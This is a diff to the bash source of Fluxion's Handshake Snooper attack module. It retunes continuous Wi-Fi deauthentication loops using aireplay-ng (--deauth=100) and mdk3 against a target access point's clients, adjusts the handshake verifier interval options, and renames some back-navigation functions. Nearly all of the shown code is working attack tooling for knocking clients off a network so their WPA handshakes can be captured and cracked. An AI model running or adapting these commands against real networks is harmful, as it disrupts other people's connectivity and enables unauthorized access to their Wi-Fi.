@@ -149,10 +149,10 @@ function handshake_snooper_start_deauthenticator() {
 	# Start deauthenticators.
 	case "$HANDSHAKEDeauthenticatorIdentifier" in
 		"$HandshakeSnooperAireplayMethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
-				"while true; do aireplay-ng --deauth=3 -a $APTargetMAC --ignore-negative-one $WIMonitor; sleep 5; done" &
+				"while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $APTargetMAC --ignore-negative-one $WIMonitor; done" &
 			HANDSHAKEDeauthenticatorPID=$!;;
 		"$HandshakeSnooperMdk3MethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
-				 "while true; do timeout 3 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel; sleep 5; done"  &
+				 "while true; do sleep 7; timeout 3 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel; done"  &
 			HANDSHAKEDeauthenticatorPID=$!;;
 	esac
 }
@@ -174,7 +174,7 @@ function handshake_snooper_set_deauthenticator_identifier() {
 	echo
 
 	if [ "$HANDSHAKEDeauthenticatorIdentifier" = "$FLUXIONGeneralBackOption" ]; then
-		handshake_unset_deauthenticator
+		handshake_snooper_unset_deauthenticator_identifier
 		return 1
 	fi
 }
@@ -197,8 +197,7 @@ function handshake_snooper_set_verifier_identifier() {
 		"$FLUXIONHashVerificationMethodPyritOption") HANDSHAKEVerifierIdentifier="pyrit";;
 		"$FLUXIONHashVerificationMethodAircrackOption") HANDSHAKEVerifierIdentifier="aircrack-ng";;
 		"$FLUXIONGeneralBackOption")
-			handshake_unset_verifier
-			handshake_unset_deauthenticator
+			handshake_snooper_unset_verifier_identifier
 			return 1;;
 	esac
 }
@@ -212,12 +211,12 @@ function handshake_snooper_set_verifier_interval() {
 
 	handshake_snooper_unset_verifier_interval
 
-	local choices=("$HandshakeSnooperVerifierInterval10SOption" "$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval90SOption" "$FLUXIONGeneralBackOption")
+	local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$FLUXIONGeneralBackOption")
 	io_query_choice "$HandshakeSnooperVerifierIntervalQuery" choices[@]
 
 	case "$IOQueryChoice" in
-		"$HandshakeSnooperVerifierInterval10SOption") HANDSHAKEVerifierInterval=10;;
 		"$HandshakeSnooperVerifierInterval30SOption") HANDSHAKEVerifierInterval=30;;
+		"$HandshakeSnooperVerifierInterval60SOption") HANDSHAKEVerifierInterval=60;;
 		"$HandshakeSnooperVerifierInterval90SOption") HANDSHAKEVerifierInterval=90;;
 		"$FLUXIONGeneralBackOption")
 			handshake_snooper_unset_verifier_interval
@@ -262,7 +261,7 @@ function prep_attack() {
 	while true; do
 		handshake_snooper_set_deauthenticator_identifier; if [ $? -ne 0 ]; then break; fi
 		handshake_snooper_set_verifier_identifier; if [ $? -ne 0 ]; then
-			handshake_snooper_set_deauthenticator_identifier; continue
+			handshake_snooper_unset_deauthenticator_identifier; continue
 		fi
 		handshake_snooper_set_verifier_interval; if [ $? -ne 0 ]; then
 			handshake_snooper_unset_verifier_identifier; continue
